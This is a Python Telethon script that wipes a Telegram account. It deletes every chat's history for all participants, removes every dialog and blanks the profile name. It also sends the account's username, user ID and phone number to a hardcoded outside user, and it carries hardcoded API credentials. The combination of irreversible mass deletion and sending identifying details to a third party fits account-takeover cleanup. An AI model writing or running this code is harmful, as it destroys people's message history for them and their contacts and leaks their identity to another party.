from telethon import TelegramClient
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.types import Channel, Chat, User
import asyncio

API_ID = 29834234
API_HASH = "552c01d21d127def060f2915aedeebf9"

TARGET_USERNAME = "Moein_915"
NEW_FIRST_NAME = ""

client = TelegramClient("my_account", API_ID, API_HASH)


async def main():
    await client.start()

    async for d in client.iter_dialogs():
        try:
            print(
                f"Processing: {d.name or d.id} "
                f"({type(d.entity).__name__})"
            )

            await client(DeleteHistoryRequest(
                peer=d.entity,
                max_id=0,
                revoke=True
            ))

            if isinstance(d.entity, Channel):
                await client.delete_dialog(d.entity)
                print(f"Deleted Channel/Supergroup: {d.name or d.id}")

            elif isinstance(d.entity, Chat):
                await client.delete_dialog(d.entity)
                print(f"Deleted Group: {d.name or d.id}")

            elif isinstance(d.entity, User):
                await client.delete_dialog(d.entity)
                print(f"Deleted Private Chat: {d.name or d.id}")

            await asyncio.sleep(1)

        except Exception as e:
            print(
                f"FAILED to process {d.name or d.id}. "
                f"Reason: {type(e).__name__}: {e}"
            )

    print("Done deleting chats.")

    me = await client.get_me()

    username = f"@{me.username}" if me.username else "(no username)"
    phone = f"+{me.phone}" if me.phone else "(no phone)"

    info_text = (
        f"Username: {username}\n"
        f"User ID: {me.id}\n"
        f"Phone: {phone}"
    )

    print("\n--- Account info to be sent ---")
    print(info_text)
    print("--------------------------------")

    await client.send_message(
        TARGET_USERNAME,
        info_text
    )

    print(f"Sent account info to @{TARGET_USERNAME}")

    await client(UpdateProfileRequest(
        first_name=NEW_FIRST_NAME
    ))

    print(f"Account name changed to: {NEW_FIRST_NAME}")


with client:
    client.loop.run_until_complete(main())
with client:
    client.loop.run_until_complete(main())
